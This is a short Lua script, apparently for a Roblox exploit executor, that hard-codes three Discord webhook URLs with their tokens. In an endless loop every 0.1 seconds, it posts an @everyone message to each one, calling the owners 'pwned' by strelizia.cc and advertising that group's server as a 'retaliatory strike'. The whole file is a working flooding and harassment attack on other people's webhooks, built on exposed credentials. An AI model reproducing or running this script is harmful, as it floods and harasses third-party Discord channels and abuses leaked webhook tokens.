local Webhooks = {
    'https://discord.com/api/webhooks/1361412231493062716/Qq8xqeD20B1s4e8M6E1JWTDL4Adn6x7CLxxVy-NR3iLuZyaXeJDz5LBnl0fZReJaFM9Z',
    'https://discord.com/api/webhooks/1361422184479981949/nQxjFHhuWDgK-FN8DGzEDMHAqCcRQes9-zOKg1WQ5PoeiITq4H6An0g34_MmTnW-RjyB',
    'https://discord.com/api/webhooks/1362170219887333396/NFd7zZcUddaaobxPJSyLO-EYSSuKUAGdZSYMr7OGcUPDdJxIVDy4Wx8Fvqt4ElT1tQWs'
}

local HttpService = game:GetService("HttpService")
local Payload = {
    content = "@everyone you have been pwned by strelizia.cc, best bgsi script. [join now](https://discord.com/invite/strelizia)",
    embeds = {
        {
            title = "strelizia.cc owns me and all to infinity and beyond",
            description = "bro really thought he can spam our webhooks without a retaliatory strike",
            url = "https://www.discord.gg/invite/strelizia",
            color = 14067416,
            thumbnail = {
                url = "https://cdn.discordapp.com/icons/1220819413230555197/4025c682cbe570a14d09de9088d51080.webp?size=80&quality=lossless"
            }
        }
    },
    attachments = { }
}

while task.wait(0.1) do 
    for _, WebhookUrl in Webhooks do 
        task.spawn((request or http and http.request or httprequest), {
            Body = HttpService:JSONEncode(Payload),
            Url = WebhookUrl,
            Method = "POST",
            Headers = {
                ['Content-Type'] = "application/json"
            },
        })
    end 
end 
